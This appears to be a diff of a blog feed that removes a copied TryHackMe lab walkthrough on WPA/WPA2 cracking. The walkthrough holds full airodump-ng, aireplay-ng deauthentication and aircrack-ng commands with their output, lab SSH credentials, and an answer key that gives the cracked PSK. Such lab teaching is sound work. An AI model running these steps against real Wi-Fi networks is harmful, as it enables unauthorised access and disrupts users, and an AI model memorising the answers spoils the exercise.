-<p>Begin by pressing the <strong>Start Machine</strong> button below in order to start the virtual machine. The VM will take about <strong>3 minutes</strong> to boot up fully. Then we need to get the AttackBox ready by pressing the <strong>Start AttackBox</strong> button at the top of the page.</p>
-
-<p>You can access the VM from the AttackBox via <strong>SSH</strong> with the following command <code class="language-plaintext highlighter-rouge">ssh glitch@MACHINE_IP</code> and entering the credentials below:</p>
-
-<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/be629720b11a294819516c1d4e738c92.png" alt="THM Key Credentials" /></p>
-
-<table>
-  <thead>
-    <tr>
-      <th><strong>Username</strong></th>
-      <th>glitch</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td><strong>Password</strong></td>
-      <td>Password321</td>
-    </tr>
-    <tr>
-      <td><strong>IP</strong></td>
-      <td>MACHINE_IP</td>
-    </tr>
-  </tbody>
-</table>
-
-<h2 id="what-is-wi-fi">What is Wi-Fi</h2>
-
-<p>The importance of the Internet in our lives is universally acknowledged without the need for any justification. Wi-Fi is the technology that connects our devices to the global network, the Internet. This seamless connection to the Internet appears to be wireless from our devices, which is true to some extent. Our devices are connected wirelessly to the router, which acts as a bridge between us and the Internet, and the router is connected to the Internet via a wired connection.</p>
-
-<p>To connect to Wi-Fi, we turn it on from our devices, and it lists all the available Wi-Fi networks around us. This list comprises the access points (often the routers) that are broadcasting Wi-Fi signals with a unique <strong>SSID</strong> (network name). You can connect to any of these if you know the correct password, also known as a pre-shared key (<strong>PSK</strong>). Once you successfully connect to a network via Wi-Fi, you will be assigned an IP address inside that network, which will uniquely identify you and help you communicate with other devices. It is just like becoming a member of a family assigned with a name that the whole family trusts.</p>
-
-<p>The image below shows an example of what connecting to an <strong>OK443S SSID</strong> requesting a PSK (password) looks like on a typical Windows machine:</p>
-
-<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/618b3fa52f0acc0061fb0172/room-content/618b3fa52f0acc0061fb0172-1730574010264.png" alt="How connecting to an SSID (OK443S) requesting a PSK (password) looks like on a typical Windows machine." /> \n</p>
-
-<p>With all this discussion on Wi-Fi, it seems like a door to our internet access, and every Wi-Fi connection forms a family of devices. Would you allow somebody you don’t really know to become part of your family? Not that easy! Probably because of the privileges a family member has, nobody from outside should ever get those.</p>
-
-<h2 id="wi-fis-pivotal-role-in-organisations---">Wi-Fi’s Pivotal Role in Organisations   <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/618b3fa52f0acc0061fb0172/room-content/618b3fa52f0acc0061fb0172-1730324115481.png" alt="Byte The Dog character." /></h2>
-
-<p>Most organisations rely on the Internet for their business functioning. Using a wired connection for all employees to connect to the Internet raises concerns about cost, efficiency, and flexibility at work. So, organisations use Wi-Fi for their networks to connect their employees to the Internet. As the employees connect to the organisation’s network, they form a family of interconnected devices. The devices inside the network can communicate with each other and request or respond to any request. Organisations tend to recruit trustworthy and professional employees to avoid any misuse of their privileges inside the network.</p>
-
-<p>However, a malicious actor from outside the organisation could still see the broadcasted Wi-Fi <strong>SSID</strong> of the organisation’s network when they turn their Wi-Fi on. This may not seem to be a problem as the attacker does not know the password, but the attacker actually has some other plans as well!</p>
-
-<p><img src="https://assets.tryhackme.com/additional/aoc2024/gifs/AoC-Day-11---Wifi-Animation-1.gif" alt="A disc with a wifi logo being split in two." /></p>
-
-<h2 id="attacks-on-wi-fi">Attacks on Wi-Fi</h2>
-
-<p>There are several techniques attackers use to exploit Wi-Fi technology. The techniques discussed here are solely for educational purposes. Unauthorised attempts to access or compromise networks are illegal and may lead to severe legal consequences. With that in mind, here are some of the most popular techniques:</p>
-
-<ul>
-  <li><strong>Evil twin attack:</strong> In this attack, the attacker creates a fake access point that has a similar name to one of your trusted Wi-Fi access points. Of course, it cannot be the exact same. If the trusted Wi-Fi’s name is “Home_Internet”, the attacker creates a fake Wi-Fi access point named “Home_Internnet” or something similar that is difficult to differentiate. The attack starts with the attacker sending de-authentication packets to all the users connected to their legitimate Wi-Fi access points. The users would face repeated disconnections from the network after this. With frustration, the users are likely to open the Wi-Fi access points list for troubleshooting and will find the attacker’s Wi-Fi with almost similar name and with greater signal strength. They would go to connect it, and once connected, the attacker could see all their traffic to or from the Internet.</li>
-  <li><strong>Rogue access point:</strong> This attack’s objective is similar to that of the evil twin attack. In this attack, the attacker sets up an open Wi-Fi access point near or inside the organisation’s physical premises to make it available to users with good signal strength. The users inside the organisation may accidentally join this network if their devices are set to connect automatically to open Wi-Fi. The attacker can intercept all their communication after the users connect to this rogue access point.</li>
-  <li><strong>WPS attack:</strong> Wi-Fi Protected Setup (WPS) was created to allow users to connect to their Wi-Fi using an 8-digit PIN without remembering complex passwords. However, this 8-digit PIN is vulnerable in some networks due to its insecure configuration. The attack is made by initiating a WPS handshake with the router and capturing the router’s response, which contains some data related to the PIN and is vulnerable to brute-force attacks. Some of the captured data is brute-forced, and the PIN is successfully extracted along with the Pre-Shared Key (PSK).</li>
-  <li><strong>WPA/WPA2 cracking:</strong> Wi-Fi Protected Access (WPA) was created to secure wireless communication. It uses a strong encryption algorithm. However, the security of this protocol is heavily influenced by the length and complexity of the Pre-Shared Key (PSK). While cracking WPA, attackers start by sending de-authentication packets to a legitimate user of the Wi-Fi network. Once the user disconnects, they try to reconnect to the network, and a 4-way handshake with the router takes place during this time. Meanwhile, the attacker turns its adaptor into monitor mode and captures the handshake. After the handshake is captured, the attacker can crack the password by using brute-force or dictionary attacks on the captured handshake file.</li>
-</ul>
-
-<p>McSkidy looks to Glitch and asks, <em>“What kind of attack are you thinking of demonstrating Glitch?”</em></p>
-
-<p>Glitch paces back and forth before coming to a sudden stop and says, <em>“Today I will be showing you how the WPA/WPA2 cracking attack works!”</em></p>
-
-<h2 id="wpawpa2-cracking">WPA/WPA2 Cracking</h2>
-
-<p>As mentioned above, WPA/WPA2 cracking begins by listening to Wi-Fi traffic to capture the 4-way handshake between a device and the access point. Since waiting for a device to connect or reconnect can take some time, deauthentication packets are sent to disconnect a client, forcing it to reconnect and initiate a new handshake, which is captured. After the handshake is captured, the attacker can crack the password (<strong>PSK</strong>) by using brute-force or dictionary attacks on the captured handshake file.</p>
-
-<p><img src="https://assets.tryhackme.com/additional/aoc2024/gifs/AoC-Day-11---Wifi-Animation-2.gif" alt="the attacker's network card listening in monitor mode, to capture a handshake between a device and an access point" /></p>
-
-<p><strong>The 4-way Handshake</strong></p>
-
-<p>The WPA password cracking process involves capturing a Wi-Fi network’s handshake to attempt a PSK (password) decryption. First, an attacker places their wireless adapter into monitor mode to scan for networks, then targets a specific network to capture the 4-way handshake. Once the handshake is captured, the attacker runs a brute-force or dictionary attack using a tool like aircrack-ng to attempt to match a wordlist against the passphrase.</p>
-
-<p>The WPA 4-way handshake is a process that helps a client device (like your phone or laptop) and a Wi-Fi router confirm they both have the right “password” or Pre-Shared Key (PSK) before securely connecting. Here’s a simplified rundown of what happens:</p>
-
-<ul>
-  <li><strong>Router sends a challenge:</strong> The router (or access point) sends a challenge” to the client, asking it to prove it knows the network’s password without directly sharing it.</li>
-  <li><strong>Client responds with encrypted information:</strong> The client takes this challenge and uses the PSK to create an encrypted response that only the router can verify if it also has the correct PSK.</li>
-  <li><strong>Router verifies and sends confirmation:</strong> If the router sees the client’s response matches what it expects, it knows the client has the right PSK. The router then sends its own confirmation back to the client.</li>
-  <li><strong>Final check and connection established:</strong> The client verifies the router’s response, and if everything matches, they finish setting up the secure connection.</li>
-</ul>
-
-<p>This handshake doesn’t directly reveal the PSK itself but involves encrypted exchanges that depend on the PSK.</p>
-
-<p><strong>The Vulnerability</strong></p>
-
-<p>The vulnerability lies in the fact that an attacker can capture this 4-way handshake if they’re listening when a device connects. With the handshake data, they can use it as a basis to attempt offline brute-force or dictionary attacks. Essentially, they try different possible passwords and test each one to see if it would produce the captured handshake data, eventually cracking the PSK if they get a match.</p>
-
-<p>The Practical</p>
-
-<p>On our current SSH session, run the command iw dev. This will show any wireless devices and their configuration that we have available for us to use.
-Terminal</p>
-
-<p>glitch@wifi:~$ iw dev
-phy#2
-Interface wlan2
-ifindex 5
-wdev 0x200000001
-addr 02:00:00:00:02:00
-type managed
-txpower 20.00 dBm</p>
-
-<p>The device/interface wlan2 is available to us, and there are two important details to take away from this output that will be useful to us:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The addr is the MAC/BSSID of our device. BSSID stands for Basic Service Set Identifier, and it's a unique identifier for a wireless device or access point's physical address.
-The type is shown as managed. This is the standard mode used by most Wi-Fi devices (like laptops, phones, etc.) to connect to Wi-Fi networks. In managed mode, the device acts as a client, connecting to an access point to join a network. There is another mode called monitor, which we will discuss shortly.
-</code></pre></div></div>
-
-<p>Now, we would like to scan for nearby Wi-Fi networks using our wlan2 device. We can use sudo iw dev wlan2 scan. The dev wlan2 specifies the wireless device you want to work with, and scan tells iw to scan the area for available Wi-Fi networks.
-Terminal</p>
-
-<p>glitch@wifi:~$ sudo iw dev wlan2 scan
-BSS 02:00:00:00:00:00(on wlan2)
-last seen: 520.388s [boottime]
-TSF: 1730575383370084 usec (20029d, 19:23:03)
-freq: 2437
-beacon interval: 100 TUs
-capability: ESS Privacy ShortSlotTime (0x0411)
-signal: -30.00 dBm
-last seen: 0 ms ago
-Information elements from Probe Response frame:
-SSID: MalwareM_AP
-Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0
-DS Parameter set: channel 6
-ERP: Barker_Preamble_Mode
-Extended supported rates: 24.0 36.0 48.0 54.0
-RSN:	 * Version: 1
-* Group cipher: CCMP
-* Pairwise ciphers: CCMP
-* Authentication suites: PSK
-* Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
-Supported operating classes:
-* current operating class: 81
-Extended capabilities:
-* Extended Channel Switching
-* Operating Mode Notification</p>
-
-<p>There is a lot of information to dissect here, but here are the most important details that indicate this device is an access point:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The BSSID and SSID of the device are 02:00:00:00:00:00 and MalwareM_AP respectively. Since the SSID is shown, this means the device is advertising a network name, which access points do to allow clients to discover and connect to the network.
-The presence of RSN (Robust Security Network) indicates the network is using WPA2, as RSN is a part of the WPA2 standard. WPA2 networks typically use RSN to define the encryption and authentication settings.
-The Group and Pairwise ciphers are CCMP. Counter Mode with Cipher Block Chaining Message Authentication Code Protocol (CCMP) is the encryption method used by WPA2.
-The Authentication suites value inside RSN is PSK indicating that this is a WPA2-Personal network, where a shared password is used for authentication.
-Another important detail is the DS Parameter set value, which shows channel 6. The channel, in terms of Wi-Fi, refers to a specific frequency range within the broader Wi-Fi spectrum that allows wireless devices to communicate with each other. There are various Wi-Fi channels, and they all help distribute network traffic across various frequency ranges, which reduces interference. The two most common Wi-Fi channels are 2.4 GHz and 5GHz. In the 2.4 GHz band, channels 1, 6, and 11 are commonly used because they don’t overlap, minimising interference. In the 5 GHz band, there are many more channels available, allowing more networks to coexist without interference.
-</code></pre></div></div>
-
-<p>Now will be a good time to discuss another type that we can use on some wireless devices: monitor mode. This is a special mode primarily used for network analysis and security auditing. In this mode, the Wi-Fi interface listens to all wireless traffic on a specific channel, regardless of whether it is directed to the device or not. It passively captures all network traffic within range for analysis without joining a network. We want to check if our wlan2 interface can use monitor mode. To achieve this, we will run the command sudo ip link set dev wlan2 down to turn our device off. Then we will switch modes with sudo iw dev wlan2 set type monitor to change wlan2 to monitor mode. Then turn our device back on with sudo ip link set dev wlan2 up.
-Terminal</p>
-
-<p>glitch@wifi:~$ sudo ip link set dev wlan2 down
-glitch@wifi:~$ sudo iw dev wlan2 set type monitor
-glitch@wifi:~$ sudo ip link set dev wlan2 up</p>
-
-<p>We can confirm that our interface is in monitor mode with the command sudo iw dev wlan2 info.
-Terminal</p>
-
-<p>glitch@wifi:~$ sudo iw dev wlan2 info
-Interface wlan2
-ifindex 5
-wdev 0x200000001
-addr 02:00:00:00:02:00
-type monitor
-wiphy 2
-channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
-txpower 20.00 dBm</p>
-
-<p>Now, let us create one more SSH session. We want to have 2 separate terminals in order to see clearly how the attack works. You can align the SSH terminals however you like, but here is an example of how it should look like.</p>
-
-<p>2 terminals with SSH sessions in the AttackBox.</p>
-
-<p>On the first terminal, we start by capturing Wi-Fi traffic in the area, specifically targeting the WPA handshake packets. We can do this with the command sudo airodump-ng wlan2. This command provides a list of nearby Wi-Fi networks (SSIDs) and shows important details like signal strength, channel, and encryption type. This information is already known to us from our previous commands.</p>
-
-<p>Note: By default, airodump-ng will automatically switch the selected wireless interface into monitor mode if the interface supports it.
-Terminal</p>
-
-<p>glitch@wifi:~$ sudo airodump-ng wlan2
-BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</p>
-
-<p>02:00:00:00:00:00  -28        2        0    0   6   54   WPA2 CCMP   PSK  MalwareM_AP</p>
-
-<p>The output reveals the information we already knew before, such as the BSSID, SSID, and the channel. However, in this particular output, we are also given the channel where our target SSID is listening (channel 6). Now, we will focus on the MalwareM_AP access point and capture the WPA handshake; this is crucial for the PSK (password) cracking process.</p>
-
-<p>First, in the current terminal, let us cancel airodump-ng using CTRL+C and then execute the command sudo airodump-ng -c 6 –bssid 02:00:00:00:00:00 -w output-file wlan2. This command targets the specific network channel and MAC address (BSSID) of the access point for which you want to capture the traffic and saves the information to a few files that start with the name output-file. These files will be used to crack the PSK. The ultimate goal of this command is to capture the 4-way handshake. It will first check for any clients that may be connected to the access point. If a client is already connected, then we can perform a deauthentication attack; otherwise, for any new client that connects, we will capture the 4-way handshake. In this particular scenario, a client is already connected. The output will look the same at first until we receive the information about the connected client, which will be displayed at the bottom of our output. It is important to leave this command running until we are done with the attack.
-Terminal</p>
-
-<p>glitch@wifi:~$ sudo airodump-ng -c 6 –bssid 02:00:00:00:00:00 -w output-file wlan2
-BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</p>
-
-<p>02:00:00:00:00:00  -28 100      631        8    0   6   54   WPA2 CCMP   PSK  MalwareM_AP</p>
-
-<p>BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes</p>
-
-<p>It should take between 1 to 5 minutes before receiving the client information. In our case, it will show like this:
-Terminal</p>
-
-<p>BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</p>
-
-<p>02:00:00:00:00:00  -28 100      631        8    0   6   54   WPA2 CCMP   PSK  MalwareM_AP</p>
-
-<p>BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes</p>
-
-<p>02:00:00:00:00:00  02:00:00:00:01:00  -29    1 - 5      0      140</p>
-
-<p>Note that the STATION section shows the device’s BSSID (MAC) of 02:00:00:00:01:00 that is connected to the access point. This is the connection that we will be attacking. Now we are ready for the next step.</p>
-
-<p>On the second terminal, we will launch the deauthentication attack. Because the client is already connected, we want to force them to reconnect to the access point, forcing it to send the handshake packets. We can break this down into 3 simple steps:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Deauthentication packets: The tool aireplay-ng sends deauthentication packets to either a specific client (targeted attack) or to all clients connected to an access point (broadcast attack). These packets are essentially "disconnect" commands that force the client to drop its current Wi-Fi connection.
-Forcing a reconnection: When the client is disconnected, it automatically tries to reconnect to the Wi-Fi network. During this reconnection, the client and access point perform the 4-way handshake as part of the reauthentication process.
-Capturing the handshake: This is where airodump-ng comes into play because it will capture this handshake as it happens, providing the data needed to attempt the WPA/WPA2 cracking.
-</code></pre></div></div>
-
-<p>We can do this with sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2. The -0 flag indicates that we are using the deauthentication attack, and the 1 value is the number of deauths to send. The -a indicates the BSSID of the access point and -c indicates the BSSID of the client to deauthenticate.
-Terminal</p>
-
-<p>glitch@wifi:~$ sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2
-19:29:37  Waiting for beacon frame (BSSID: 02:00:00:00:00:00) on channel 6
-19:29:38  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:01:00] [ 0| 0 ACKs]</p>
-
-<p>Now, if we look back on our first terminal, we will see the WPA handshake shown on the top-right of our output as WPA handshake: 02:00:00:00:00:00. All of this information is being saved into our output files.
-Terminal</p>
-
-<p>CH  6 ][ Elapsed: 1 min ][ 2024-11-02 19:30 ][ WPA handshake: 02:00:00:00:00:00</p>
-
-<p>BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</p>
-
-<p>02:00:00:00:00:00  -28 100      631        8    0   6   54   WPA2 CCMP   PSK  MalwareM_AP</p>
-
-<p>BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes</p>
-
-<p>02:00:00:00:00:00  02:00:00:00:01:00  -29    1 - 5      0      140  EAPOL</p>
-
-<p>In the second terminal, we can use the captured WPA handshake to attempt to crack the WPA/WP2 passphrase. We will be performing a dictionary attack in order to match the passphrase against each entry in a specified wordlist file. A shortened version of the infamous rockyou.txt wordlist has already been provided for us to use. This is located in the /home/glitch/ directory. If the passphrase is weak and appears in the wordlist, it will eventually be cracked. The command sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap will do this for us where the -a 2 flag indicates the WPA/WPA2 attack mode. The -b indicates the BSSID of the access point, and the -w flag indicates the dictionary list to use for the attack. Finally, we select the output files that we will be using, which contain the 4-way handshake that we will be cracking.
-Terminal</p>
-
-<p>glitch@wifi:~$ sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap
-Reading packets, please wait…
-Opening output-file-01.cap
-Read 276 packets.
-1 potential targets</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                           Aircrack-ng 1.6
-
-  [00:00:01] 304/513 keys tested (217.04 k/s)
-
-  Time left: 0 seconds                                      59.26%
-
-             KEY FOUND! [ REDACTED ]
-
-
-  Master Key     : B6 53 9A 71 8C C4 74 5F E3 26 49 82 37 74 65 09
-                   BE C5 62 CE 43 C4 68 A7 B4 8F 8C E6 98 EE 1C CB
-
-  Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-                   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-                   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-                   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-
-  EAPOL HMAC     : C8 8E D5 F4 B4 5A 1D C4 6C 41 35 07 68 81 79 CD
-</code></pre></div></div>
-
-<p>Note: If you get an Packets contained no EAPOL data; unable to process this AP error, this means that you ran aircrack-ng prior to the handshake being captured or that the handshake was not captured at all. If that’s the case, then re-do all of the steps in order to capture the WPA handshake.</p>
-
-<p>With the PSK, we can now join the MalwareM_AP access point. In a typical engagement, we would do this to inspect the new network, or in some cases, joining the access point is enough to show impact. First, press CTRL+C on the terminal that has airodump-ng running in order to stop the airodump-ng process. We do this because we will not be able to join the Wi-Fi network while airodump-ng is running due to the fact that we are actively using the interface in monitor mode. Then execute the following commands:
-Terminal</p>
-
-<p>glitch@wifi:~$ wpa_passphrase MalwareM_AP ‘ENTER PSK HERE’ &gt; config
-glitch@wifi:~$ sudo wpa_supplicant -B -c config -i wlan2</p>
-
-<p>Note: If you get a rfkill: Cannot get wiphy information error, you can ignore it. You will also notice that wpa_supplicant has automatically switched our wlan2 interface to managed mode.</p>
-
-<p>Giving it about 10 seconds and checking the wireless interfaces once again with iw dev shows that we have joined the MalwareM_AP SSID.</p>
-
-<p>Terminal</p>
-
-<p><code class="language-plaintext highlighter-rouge">glitch@wifi:~$ iw dev phy#2 -- Removed for brevity --</code></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Interface wlan2
-	ifindex 5
-	wdev 0x200000001
-	addr 02:00:00:00:02:00
-	ssid MalwareM_AP
-	type managed
-	channel 6 (2437 MHz), width: 20 MHz (no HT), center1: 2437 MHz
-	txpower 20.00 dBm
-</code></pre></div></div>
-
-<p>The End</p>
-
-<p>McSkidy looked in awe as Glitch flawlessly exposed a weakness in the Wi-Fi network.</p>
-
-<p>Glitch ponders and says, <em>“That password is pretty weak, I must say. I wouldn’t have been surprised if the Mayor had already found a way.”</em></p>
-
-<p>McSkidy gets to work right away while Glitch thinks about what is next.</p>
-
-<p>Glitch stops and says, <em>“I am ever curious if the Mayor knows much about race conditions and how will that affect us?”</em></p>
-
-<p>Answer the questions below</p>
-
-<p>What is the BSSID of our wireless interface?</p>
-
-<p>02:00:00:00:02:00</p>
-
-<p>What is the SSID and BSSID of the access point? Format: SSID, BSSID</p>
-
-<p>MalwareM_AP, 02:00:00:00:00:00</p>
-
-<p>What is the BSSID of the wireless interface that is already connected to the access point?</p>
-
-<p>02:00:00:00:01:00</p>
-
-<p>What is the PSK after performing the WPA cracking attack?</p>
-
-<p>fluffy/champ24</p>
-
-<p>If you enjoyed this task, feel free to check out the <a href="https://tryhackme.com/module/networking">Networking</a> module.</p>]]></content><author><name>Michael</name></author><summary type="html"><![CDATA[The Story]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day11Header.png" /><media:content medium="image" url="http://localhost:4000/Day11Header.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+<p>Where balances shift and numbers soar, look for an entry - an open door!</p>]]></content><author><name>Miuchael</name></author><summary type="html"><![CDATA[The Story]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day12Header.png" /><media:content medium="image" url="http://localhost:4000/Day12Header.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
